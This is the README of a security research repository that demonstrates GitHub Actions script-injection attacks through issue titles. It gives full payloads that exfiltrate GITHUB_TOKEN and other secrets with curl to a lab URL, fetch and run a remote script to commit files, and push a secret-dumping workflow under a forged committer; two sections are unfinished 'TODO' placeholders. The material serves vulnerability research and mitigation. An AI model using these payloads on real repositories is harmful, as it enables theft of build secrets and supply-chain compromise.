# Github Actions Injection Vulnerability Demo

This repository contains several utility scripts and Github Actions we used in our research for [Github Actions injection vulnerabilities](https://cycode.com/blog/github-actions-vulnerabilities/).
We presented this talk on several occasions:
- SupplyChainSecurityCon 2022 (part of OpenSourceSummit NA) - [Github Actions Security Landscape](https://www.youtube.com/watch?v=dTrHKa9mbdQ)
- DevSecCon24 - [Github Actions Security Landscape](https://www.youtube.com/watch?v=zr4nka52Fk0)

## Article Outline

Our research blog describes how we found several popular open source projects vulnerable to [script injection attack](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#good-practices-for-mitigating-script-injection-attacks) through user-controlled input, such as Github issue title and body.
We deeply investigated this threat and tried to understand the implications of such a build compromise. We quickly understood that the consequences could be pretty disastrous:
- The attacker can exfiltrate sensitive tokens from the build service (such as AWS tokens, docker hub, etc.)
- The attacker can commit new code to the repository and cause a potential supply-chain attack on the product's users.

We also show how to mitigate such attacks and their consequences.

## Demos

As explained in the article, the demos show the possible implications of a malicious attacker that gained control over the build process.
The vulnerable workflow we'll use through the demos is [vuln](.github/workflows/vuln.yml), which will be triggered whenever a new issue is created.

### Demo 1 - Exfiltrating sensitive secrets

First, you must set up a server to listen to the exfiltrated secrets in a lab environment. You can use our https://github.com/CycodeLabs/simple-http-logger for that.

Then, change the `<LAB_URL>` parameter with your lab server URL, and create an issue with the following title:

```bash
Innocent bug" && curl -d “token=$GITHUB_TOKEN” <LAB_URL> && sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL> && sleep 2 && echo "
```

This payload consists of two commands:

```bash
# Exfiltrating GITHUB_TOKEN
curl -d “token=$GITHUB_TOKEN” <LAB_URL>

# Exfiltrating BOT_TOKEN through the script that comes after
sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL>
```

This script uses another tool we developed - [gh-action-shell-monitor](https://github.com/CycodeLabs/gh-action-shell-monitor). This tool listens for any shell files modified in the specified directory and sends them to a designated server.
The result would be receiving the complete script on our lab server and `BOT_TOKEN`.

### Demo 2 - Committing to the repository

We can use simple git commands and commit a "malicious" file into the repository during the build process.

The issue title for the demo:

```bash
Innocent bug" && curl -o /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/scripts/commit_file.sh && chmod +x /tmp/script.sh && /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file && echo "
```

This payload consists of the following commands:

```bash
# Fetching the commit script
curl -o /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/scripts/commit_file.sh

chmod +x /tmp/script.sh

# Running it together with our "malicious" file
/tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file
```

### Demo 3 - Exfiltrating repository and organization secrets

In this demo, we used the commit capability to get the repository/organization secrets that weren't necessarily defined in that specific workflow but were defined for that repository.

First, we need to set up the server in the first demo.

The issue title for the demo:

```bash
# Send as issue body because issue title is capped with character limit
" && WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0) && curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}' && echo "
```

```bash
# Fetching the workflow from our repository
WORKFLOW_CONTENT=$(curl -s https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/actions/expose_secrets.yml | base64 -w 0)

# Committing it to current repository
curl -X PUT -H "Authorization: Token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"},"content":"'"$WORKFLOW_CONTENT"'"}'
```

This payload consists of the following command:

```bash
TODO - update
```

The content is base64 encoding of the workflow we want to commit:

```yaml
TODO - update
```

So the procedure of the demo is the following:

- We inject our malicious payload into the `Vuln` workflow.
- The `Vuln` workflow invokes Github API to commit a new workflow, the `Exposing ALL Secrets` workflow.
- The `Vuln` workflow ends.
- Because of `workflow_run:`, the Github Actions service will trigger `Exposing ALL Secrets` when `Vuln` ends.
